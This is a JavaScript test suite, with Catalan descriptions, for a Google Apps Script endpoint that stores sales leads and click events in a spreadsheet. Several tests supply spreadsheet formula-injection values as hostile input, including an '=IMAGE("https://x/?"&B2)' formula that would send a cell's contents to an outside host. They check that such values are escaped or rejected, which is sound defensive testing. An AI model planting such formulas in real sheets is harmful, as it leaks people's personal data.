import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import vm from 'node:vm';

const SOURCE = readFileSync('apps-script/Code.gs', 'utf8');

// Full de càlcul fals: una matriu de files, amb els formats que s'hi apliquen.
// Zona horària del full de prova: llunyana d'UTC perquè es noti que el dia i l'hora la fan servir.
const ZONE = 'Asia/Tokyo';
const formatDate = (date, zone, format) => {
  const p = Object.fromEntries(new Intl.DateTimeFormat('en-CA', { timeZone: zone, year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hourCycle: 'h23' }).formatToParts(date).map((x) => [x.type, x.value]));
  return format === 'yyyy-MM-dd' ? `${p.year}-${p.month}-${p.day}` : `${p.hour}:${p.minute}:${p.second}`;
};

class FakeSheet {
  constructor() { this.rows = []; this.formats = []; this.formatted = new Set(); this.frozen = 0; this.maxRows = 1000; }
  getLastRow() { return this.rows.length; }
  getMaxRows() { return this.maxRows; }
  insertRowsAfter(position, howMany) { assert.equal(position, this.maxRows); this.maxRows += howMany; }
  setFrozenRows(n) { this.frozen = n; }
  getRange(row, col, nRows = 1, nCols = 1) {
    const sheet = this;
    // Com al full real: fora de la quadrícula, l'accés falla.
    if (row + nRows - 1 > sheet.maxRows) throw new Error('The coordinates of the range are outside the dimensions of the sheet.');
    return {
      getValues: () => Array.from({ length: nRows }, (_, i) => Array.from({ length: nCols }, (_, j) => (sheet.rows[row - 1 + i] ?? [])[col - 1 + j] ?? '')),
      setValues(values) { values.forEach((v, i) => { sheet.rows[row - 1 + i] = [...(sheet.rows[row - 1 + i] ?? [])]; v.forEach((x, j) => { sheet.rows[row - 1 + i][col - 1 + j] = x; }); }); },
      setNumberFormat(format) { sheet.formats.push(format); for (let i = 0; i < nRows; i++) sheet.formatted.add(row + i); },
    };
  }
}

function load({ token, sheet = new FakeSheet() } = {}) {
  const lock = { waited: 0, released: 0, waitLock() { this.waited++; }, releaseLock() { this.released++; } };
  const book = {
    sheets: { Leads: sheet },
    getSheetByName(name) { return this.sheets[name] ?? null; },
    insertSheet(name) { this.sheets[name] = new FakeSheet(); return this.sheets[name]; },
    getSpreadsheetTimeZone: () => ZONE,
  };
  const context = {
    SpreadsheetApp: { getActiveSpreadsheet: () => book },
    LockService: { getScriptLock: () => lock },
    PropertiesService: { getScriptProperties: () => ({ getProperty: (k) => (k === 'TOKEN' ? token : null) }) },
    ContentService: { MimeType: { JSON: 'json' }, createTextOutput: (text) => ({ text, setMimeType() { return this; } }) },
    Utilities: { formatDate },
    Array, String, JSON, Date, Object, Math, RegExp, Number, isFinite,
  };
  vm.createContext(context);
  const api = vm.runInContext(`${SOURCE}\n;({ COLUMNS, CLICK_COLUMNS, sanitizeLead, sanitizeClick, ensureHeader, upsertLead, recordClick, doPost, doGet })`, context);
  return { api, sheet, book, lock };
}

const contact = { name: 'Ana', email: 'Ana@Example.com', phone: '+34 600 00 00 00', privacy: true, newsletter: true, lang: 'pt', origin: 'mobil', product: 'sifly,tko', city: ' Lisboa ' };
const complete = { id: 'abc-12345', stage: 'complete', contact };
const step1 = { ...complete, stage: 'step1' };
const clickBody = { visit: 'visit-0001', button: 'whatsapp', from: 'entry', lang: 'pt', origin: 'tauleta', products: 'sifly', city: 'Lisboa', device: 'mobile', os: 'ios', browserLang: 'pt-PT', tz: 'Europe/Lisbon', screen: '360x740', seconds: 12, referrer: 'www.google.com' };
const click = { id: 'click-0001', stage: 'click', click: clickBody };
const post = (api, payload) => JSON.parse(api.doPost({ postData: { contents: typeof payload === 'string' ? payload : JSON.stringify(payload) } }).text);

test('sanitizeLead accepta un lead complet, normalitza el correu i desa producte i ciutat; sense perfilació, els camps queden buits', () => {
  const { api } = load();
  const lead = api.sanitizeLead(complete);
  assert.deepEqual([lead.stage, lead.email, lead.product, lead.city], ['complete', 'ana@example.com', 'sifly,tko', 'Lisboa']);
  assert.deepEqual([lead.profile, lead.activity, lead.comments], ['', '', '']);
});
test('contacte: almenys un de telèfon o correu; el que hi hagi es valida', () => {
  const { api } = load();
  const lead = (patch) => api.sanitizeLead({ ...complete, contact: { ...contact, ...patch } });
  assert.deepEqual([lead({ phone: '' }).phone, lead({ phone: '' }).email], ['', 'ana@example.com']);
  assert.deepEqual([lead({ email: '' }).email, lead({ email: '' }).phone], ['', '+34 600 00 00 00']);
  assert.equal(lead({ email: '', phone: '' }), null);
  assert.equal(lead({ email: 'mal', phone: '' }), null, 'un correu omplert però invàlid es rebutja');
});
test('perfilació: només a l\'etapa complete, amb opcions validades i text net', () => {
  const { api } = load();
  const profiling = { profile: 'profesional', activity: 'vela', hasBoat: 'si', hasElectric: 'x', intent: 'no', enthusiasm: ['noise', 'other', 'inventada'], enthusiasmOther: 'silenci', concerns: ['range'], concernsOther: 'ignorat', factors: ['price'], comments: '=1+1' };
  const lead = api.sanitizeLead({ ...complete, profiling });
  assert.deepEqual([lead.profile, lead.activity, lead.hasBoat, lead.hasElectric, lead.intent], ['profesional', 'vela', 'si', '', 'no']);
  assert.deepEqual([lead.enthusiasm, lead.enthusiasmOther, lead.concerns, lead.concernsOther], ['noise, other', 'silenci', 'range', '']);
  assert.equal(api.sanitizeLead({ ...step1, profiling }).profile, '', 'el parcial no porta perfilació');
  assert.equal(api.sanitizeLead({ ...complete, profiling: { profile: 'x' } }).profile, '');
});
test('un lead complet sense perfilació (perfil saltat) és vàlid; el text amb «=» es protegeix a la fila', () => {
  const { api, sheet } = load();
  api.ensureHeader(sheet, api.COLUMNS);
  api.upsertLead(sheet, api.sanitizeLead({ ...complete, profiling: { profile: 'particular', comments: '=1+1' } }), '2026-11-17T10:00:00Z');
  const col = (name) => sheet.rows[1][api.COLUMNS.indexOf(name)];
  assert.equal(col('comments'), "'=1+1");
  assert.equal(col('stage'), 'complete');
});
test('sanitizeLead no exigeix perfil i accepta l\'etapa «step1»', () => {
  const { api } = load();
  assert.ok(api.sanitizeLead(complete));
  assert.equal(api.sanitizeLead(step1).stage, 'step1');
});
test('product: diversos ids separats per comes es desen; un format invàlid o massa ids deixa el producte buit sense rebutjar el lead', () => {
  const { api } = load();
  const product = (value) => api.sanitizeLead({ ...complete, contact: { ...contact, product: value } }).product;
  assert.equal(product('boatee,ez-raft'), 'boatee,ez-raft');
  for (const bad of ['sifly,', ',sifly', 'a b', 'Sifly', Array.from({ length: 11 }, (_, i) => `m${i}`).join(',')]) assert.equal(product(bad), '', bad);
  assert.equal(product(Array.from({ length: 10 }, (_, i) => `m${i}`).join(',')).split(',').length, 10);
});
test('la ciutat es retalla a 80 caràcters i queda buida si falta', () => {
  const { api } = load();
  assert.equal(Array.from(api.sanitizeLead({ ...complete, contact: { ...contact, city: 'c'.repeat(100) } }).city).length, 80);
  assert.equal(api.sanitizeLead({ ...complete, contact: { ...contact, city: undefined } }).city, '');
});
test('es rebutgen les càrregues invàlides: privacitat no acceptada, id, etapa, correu, nom, telèfon, idioma o origen', () => {
  const { api } = load();
  const bad = (patch) => api.sanitizeLead({ ...complete, contact: { ...contact, ...patch } });
  assert.equal(bad({ privacy: false }), null);
  assert.equal(bad({ privacy: 'true' }), null);
  assert.equal(bad({ email: 'no-es-un-correu' }), null);
  assert.equal(bad({ name: '   ' }), null);
  assert.equal(bad({ lang: 'fr' }), null);
  assert.equal(bad({ origin: 'web' }), null);
  assert.equal(api.sanitizeLead({ ...complete, id: 'curt' }), null);
  assert.equal(api.sanitizeLead({ ...complete, id: 'un id amb espais i símbols!' }), null);
  assert.equal(api.sanitizeLead({ ...complete, stage: 'qualsevol' }), null);
  assert.equal(api.sanitizeLead(null), null);
  assert.equal(api.sanitizeLead('text'), null);
});
test('el nom es retalla i els camps desconeguts s\'ignoren', () => {
  const { api } = load();
  const lead = api.sanitizeLead({ ...complete, extra: 'x', contact: { ...contact, name: 'n'.repeat(500), hacker: 1 } });
  assert.equal(Array.from(lead.name).length, 100);
  assert.equal(Object.hasOwn(lead, 'hacker'), false);
  assert.equal(Object.hasOwn(lead, 'extra'), false);
});
test('ensureHeader d\'un full nou escriu la capçalera, congela la fila i dona format de text; una segona vegada no fa res', () => {
  const { api, sheet } = load();
  api.ensureHeader(sheet, api.COLUMNS);
  api.ensureHeader(sheet, api.COLUMNS);
  assert.deepEqual(sheet.rows[0], [...api.COLUMNS]); // còpia: l'array de l'script viu en un altre context de vm
  assert.equal(sheet.rows.length, 1);
  assert.equal(sheet.frozen, 1);
  assert.deepEqual(sheet.formats, ['@']);
});
test('ensureHeader reescriu només la capçalera quan ha canviat («demo» → «city») sense tocar les files', () => {
  const { api, sheet } = load();
  const old = [...api.COLUMNS]; old[old.indexOf('city')] = 'demo';
  sheet.rows.push(old, ['x', 'complete']);
  api.ensureHeader(sheet, api.COLUMNS);
  assert.deepEqual(sheet.rows[0], [...api.COLUMNS]);
  assert.deepEqual(sheet.rows[1], ['x', 'complete']);
  assert.deepEqual(sheet.formats, [], 'un full existent no es torna a formatar');
});
test('«city» ocupa el lloc de l\'antiga «demo» i les columnes heretades es conserven', () => {
  const { api } = load();
  assert.equal(api.COLUMNS.indexOf('city'), 24);
  assert.equal(api.COLUMNS.includes('demo'), false);
  for (const heritage of ['profile', 'activity', 'enthusiasm', 'comments']) assert.ok(api.COLUMNS.includes(heritage), heritage);
});
test('upsert: el lead crea la fila, reintentat no la duplica; el final completa un parcial antic conservant createdAt', () => {
  const { api, sheet } = load();
  api.ensureHeader(sheet, api.COLUMNS);
  assert.equal(api.upsertLead(sheet, api.sanitizeLead(step1), '2026-11-17T10:00:00Z'), 'created');
  assert.equal(api.upsertLead(sheet, api.sanitizeLead(complete), '2026-11-17T10:02:00Z'), 'updated');
  assert.equal(api.upsertLead(sheet, api.sanitizeLead(complete), '2026-11-17T10:02:05Z'), 'updated');
  assert.equal(sheet.rows.length, 2);
  const col = (name) => sheet.rows[1][api.COLUMNS.indexOf(name)];
  assert.deepEqual([col('stage'), col('createdAt'), col('city'), col('product')], ['complete', '2026-11-17T10:00:00Z', 'Lisboa', 'sifly,tko']);
  assert.deepEqual([col('privacy'), col('newsletter'), col('email')], ['si', 'si', 'ana@example.com']);
});
test('upsert: un parcial antic que arriba tard no degrada una fila completa', () => {
  const { api, sheet } = load();
  api.ensureHeader(sheet, api.COLUMNS);
  api.upsertLead(sheet, api.sanitizeLead(complete), 't1');
  assert.equal(api.upsertLead(sheet, api.sanitizeLead(step1), 't2'), 'ignored');
  assert.equal(sheet.rows[1][api.COLUMNS.indexOf('stage')], 'complete');
});
test('upsert: dos leads diferents són dues files, i cada fila (nova o actualitzada) té format de text', () => {
  const { api, sheet } = load();
  api.ensureHeader(sheet, api.COLUMNS);
  api.upsertLead(sheet, api.sanitizeLead(complete), 't1');
  api.upsertLead(sheet, api.sanitizeLead({ ...complete, id: 'altre-id-99' }), 't2');
  assert.equal(sheet.rows.length, 3);
  assert.ok(sheet.formatted.has(2) && sheet.formatted.has(3));
});
test('upsert: quan el full s\'omple (1000 files) s\'amplia en lloc de fallar', () => {
  const { api, sheet } = load();
  api.ensureHeader(sheet, api.COLUMNS);
  for (let i = 0; i < 999; i++) sheet.rows.push(['x']);
  assert.equal(api.upsertLead(sheet, api.sanitizeLead(complete), 't1'), 'created');
  assert.equal(sheet.rows.length, 1001);
  assert.ok(sheet.maxRows > 1000);
});
test('un valor que comença per «=» es desa escapat amb apòstrof perquè Sheets no l\'executi com a fórmula', () => {
  const { api, sheet } = load();
  api.ensureHeader(sheet, api.COLUMNS);
  api.upsertLead(sheet, api.sanitizeLead({ ...complete, contact: { ...contact, name: '=HYPERLINK("http://example.com","x")', city: '=1+1' } }), 't1');
  const col = (name) => sheet.rows[1][api.COLUMNS.indexOf(name)];
  assert.equal(col('name'), `'=HYPERLINK("http://example.com","x")`);
  assert.equal(col('city'), "'=1+1");
  assert.equal(col('email'), 'ana@example.com');
});

test('escapat de fórmules: també «+», «-», «@», tabulador i retorn, però no al telèfon (comença per «+» per disseny)', () => {
  const { api, sheet } = load();
  api.ensureHeader(sheet, api.COLUMNS);
  const city = (value) => {
    api.upsertLead(sheet, api.sanitizeLead({ ...complete, id: `id-${Math.random().toString(36).slice(2, 12)}`, contact: { ...contact, city: value } }), 't');
    return sheet.rows.at(-1)[api.COLUMNS.indexOf('city')];
  };
  for (const evil of ['+1+1', '-1+1', '@SUM(1)', '=1+1']) assert.equal(city(evil), `'${evil}`, evil);
  assert.equal(city('Lisboa'), 'Lisboa');
  assert.equal(city('Vila +Nova'), 'Vila +Nova');
  assert.equal(sheet.rows.at(-1)[api.COLUMNS.indexOf('phone')], '+34 600 00 00 00', 'el telèfon no s\'escapa');
});
test('sanitizeClick accepta un clic complet i el normalitza', () => {
  const { api } = load();
  const c = api.sanitizeClick(click);
  assert.deepEqual({ ...c }, { id: 'click-0001', ...clickBody, seconds: 12 });
});
test('sanitizeClick rebutja un id curt, un botó, un lloc, un idioma o un origen invàlids, o una etapa que no és «click»', () => {
  const { api } = load();
  const bad = (patch) => api.sanitizeClick({ ...click, click: { ...clickBody, ...patch } });
  for (const patch of [{ button: 'sms' }, { from: 'x' }, { lang: 'fr' }, { origin: 'web' }]) assert.equal(bad(patch), null, JSON.stringify(patch));
  assert.equal(api.sanitizeClick({ ...click, id: 'curt' }), null);
  assert.equal(api.sanitizeClick({ ...click, stage: 'complete' }), null);
  assert.equal(api.sanitizeClick({ ...click, click: undefined }), null);
  assert.equal(api.sanitizeClick(null), null);
});
test('sanitizeClick: els camps opcionals que no encaixen queden buits sense rebutjar el clic, i es retallen', () => {
  const { api } = load();
  const c = api.sanitizeClick({ ...click, click: { ...clickBody, screen: '360 x 740', device: 'smartwatch', os: 'x', seconds: -5, visit: 'x', products: 'No Valid', referrer: 'r'.repeat(200), city: 'c'.repeat(100), tz: 't'.repeat(100), browserLang: 'b'.repeat(40) } });
  assert.deepEqual([c.screen, c.device, c.os, c.seconds, c.visit, c.products], ['', '', '', '', '', '']);
  assert.deepEqual([c.referrer.length, c.city.length, c.tz.length, c.browserLang.length], [80, 80, 40, 15]);
  assert.equal(api.sanitizeClick({ ...click, click: { ...clickBody, seconds: 99999 } }).seconds, '');
  assert.equal(api.sanitizeClick({ ...click, click: { ...clickBody, seconds: undefined } }).seconds, '');
});
test('recordClick crea la pestanya «Clics» amb capçalera i una fila amb dia i hora de la zona del full', () => {
  const { api, book } = load();
  assert.equal(api.recordClick(book, api.sanitizeClick(click), new Date('2026-11-17T10:30:00Z')), 'created');
  const clics = book.sheets.Clics;
  assert.deepEqual(clics.rows[0], [...api.CLICK_COLUMNS]);
  assert.equal(api.CLICK_COLUMNS.length, 18);
  const col = (name) => clics.rows[1][api.CLICK_COLUMNS.indexOf(name)];
  assert.deepEqual([col('day'), col('time'), col('at')], ['2026-11-17', '19:30:00', '2026-11-17T10:30:00.000Z']);
  assert.deepEqual([col('button'), col('from'), col('lang'), col('origin'), col('visit'), col('products'), col('city'), col('device'), col('os'), col('screen'), col('seconds'), col('referrer')],
    ['whatsapp', 'entry', 'pt', 'tauleta', 'visit-0001', 'sifly', 'Lisboa', 'mobile', 'ios', '360x740', 12, 'www.google.com']);
});
test('recordClick: el mateix clic reintentat no es duplica; un altre és una fila nova; un valor amb «=» s\'escapa', () => {
  const { api, book } = load();
  const now = new Date('2026-11-17T10:30:00Z');
  api.recordClick(book, api.sanitizeClick(click), now);
  assert.equal(api.recordClick(book, api.sanitizeClick(click), now), 'ignored');
  assert.equal(api.recordClick(book, api.sanitizeClick({ ...click, id: 'click-0002', click: { ...clickBody, referrer: '=HYPERLINK("x")', city: '=1+1' } }), now), 'created');
  const clics = book.sheets.Clics;
  assert.equal(clics.rows.length, 3);
  assert.equal(clics.rows[2][api.CLICK_COLUMNS.indexOf('referrer')], `'=HYPERLINK("x")`);
  assert.equal(clics.rows[2][api.CLICK_COLUMNS.indexOf('city')], "'=1+1");
});
test('doPost: un lead es desa a «Leads» i un clic a «Clics», sense barrejar-se', () => {
  const { api, sheet, book, lock } = load();
  assert.deepEqual(post(api, complete), { ok: true, result: 'created' });
  assert.deepEqual(post(api, click), { ok: true, result: 'created' });
  assert.deepEqual(post(api, click), { ok: true, result: 'ignored' });
  assert.equal(sheet.rows.length, 2);
  assert.equal(book.sheets.Clics.rows.length, 2);
  assert.deepEqual([lock.waited, lock.released], [3, 3]);
});
test('doPost: JSON invàlid, lead o clic invàlids → «invalid» sense tocar cap full', () => {
  const { api, sheet, book } = load();
  assert.deepEqual(post(api, '{no és json'), { ok: false, error: 'invalid' });
  assert.deepEqual(post(api, { ...complete, contact: { ...contact, privacy: false } }), { ok: false, error: 'invalid' });
  assert.deepEqual(post(api, { ...click, click: { ...clickBody, button: 'sms' } }), { ok: false, error: 'invalid' });
  assert.equal(sheet.rows.length, 0);
  assert.equal(book.sheets.Clics, undefined);
});
test('doPost: amb la propietat TOKEN cal enviar el token correcte, també als clics', () => {
  const { api, sheet, book } = load({ token: 's3cret' });
  assert.deepEqual(post(api, complete), { ok: false, error: 'token' });
  assert.deepEqual(post(api, click), { ok: false, error: 'token' });
  assert.deepEqual(post(api, { ...complete, token: 'incorrecte' }), { ok: false, error: 'token' });
  assert.deepEqual(post(api, { ...complete, token: 's3cret' }), { ok: true, result: 'created' });
  assert.deepEqual(post(api, { ...click, token: 's3cret' }), { ok: true, result: 'created' });
  assert.equal(sheet.rows.length, 2);
  assert.equal(book.sheets.Clics.rows.length, 2);
});
test('doPost: un error intern respon «error» (el client reintenta) i allibera el bloqueig', () => {
  const sheet = new FakeSheet();
  sheet.getLastRow = () => { throw new Error('boom'); };
  const { api, lock } = load({ sheet });
  assert.deepEqual(post(api, complete), { ok: false, error: 'error' });
  assert.equal(lock.released, 1);
});
test('doGet respon ok (per comprovar que l\'URL està desplegada)', () => {
  const { api } = load();
  assert.deepEqual(JSON.parse(api.doGet().text), { ok: true, version: 'cro-enertech-2026-11-13' });
});

test('un clic de descàrrega de PDF es registra; un botó desconegut es rebutja', () => {
  const { api } = load();
  const download = { ...click, click: { ...clickBody, button: 'download', from: 'done', products: 'sifly' } };
  assert.equal(api.sanitizeClick(download).button, 'download');
  assert.equal(api.sanitizeClick({ ...click, click: { ...clickBody, button: 'altre' } }), null);
});

test('telèfon: format «+prefix número»; un valor que sembla fórmula o no encaixa es rebutja', () => {
  const { api } = load();
  const phone = (value) => api.sanitizeLead({ ...complete, contact: { ...contact, email: '', phone: value } });
  assert.equal(phone('+351 912 345 678').phone, '+351 912 345 678');
  assert.equal(phone('+34 (93) 123-45-67').phone, '+34 (93) 123-45-67');
  for (const bad of ['=IMAGE("https://x/?"&B2)', '@SUM(A1)', '600000000', '+34', 'abc']) assert.equal(phone(bad), null, bad);
});
